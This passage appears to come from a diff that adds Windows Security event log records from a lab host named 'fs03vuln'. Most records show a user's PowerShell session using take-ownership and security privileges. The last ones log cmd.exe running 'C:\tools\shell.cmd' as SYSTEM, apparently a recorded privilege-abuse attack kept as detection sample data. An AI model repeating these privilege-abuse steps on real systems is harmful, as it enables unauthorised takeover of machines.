+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937822</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x4d0</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937823</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x4d8</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937824</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x4d8</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:31.229613300Z" />
+      <EventRecordID>937825</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\RasPbFile</Data>
+      <Data Name="HandleId">0x5a4</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:31.229613300Z" />
+      <EventRecordID>937826</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x5a4</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:31.229613300Z" />
+      <EventRecordID>937827</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Key</Data>
+      <Data Name="ObjectName">\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters</Data>
+      <Data Name="HandleId">0x5c8</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%4432
+				%%4433
+				%%4434
+				%%4435
+				%%4436
+				%%4437
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:31.229613300Z" />
+      <EventRecordID>937828</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x5c8</Data>
+      <Data Name="AccessMask">983103</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:32.432741800Z" />
+      <EventRecordID>937829</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Key</Data>
+      <Data Name="ObjectName">\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters</Data>
+      <Data Name="HandleId">0x65c</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%4432
+				%%4433
+				%%4434
+				%%4435
+				%%4436
+				%%4437
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:32.432741800Z" />
+      <EventRecordID>937830</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x65c</Data>
+      <Data Name="AccessMask">983103</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:32.463991400Z" />
+      <EventRecordID>937831</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Key</Data>
+      <Data Name="ObjectName">\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB</Data>
+      <Data Name="HandleId">0x5e8</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1542
+				%%4432
+				%%4433
+				%%4434
+				%%4435
+				%%4436
+				%%4437
+				</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege</Data>
+      <Data Name="ProcessId">0x5e4</Data>
+      <Data Name="ProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:32.463991400Z" />
+      <EventRecordID>937832</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x5e8</Data>
+      <Data Name="AccessMask">17760319</Data>
+      <Data Name="PrivilegeList">SeSecurityPrivilege</Data>
+      <Data Name="ProcessId">0x5e4</Data>
+      <Data Name="ProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4688</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>13312</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:45.843690900Z" />
+      <EventRecordID>937833</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4" ThreadID="1860" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-18</Data>
+      <Data Name="SubjectUserName">FS03VULN$</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x3e7</Data>
+      <Data Name="NewProcessId">0x214</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="TokenElevationType">%%1936</Data>
+      <Data Name="ProcessId">0x2e8</Data>
+      <Data Name="CommandLine">C:\Windows\SYSTEM32\cmd.exe /c "C:\tools\shell.cmd"</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4688</EventID>
+      <Version>1</Version>
+      <Level>0</Level>
+      <Task>13312</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:45.843690900Z" />
+      <EventRecordID>937834</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4" ThreadID="1860" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-18</Data>
+      <Data Name="SubjectUserName">FS03VULN$</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x3e7</Data>
+      <Data Name="NewProcessId">0xe74</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
+      <Data Name="TokenElevationType">%%1936</Data>
+      <Data Name="ProcessId">0x214</Data>
+      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff</Data>
+    </EventData>
+  </Event>
+</root>
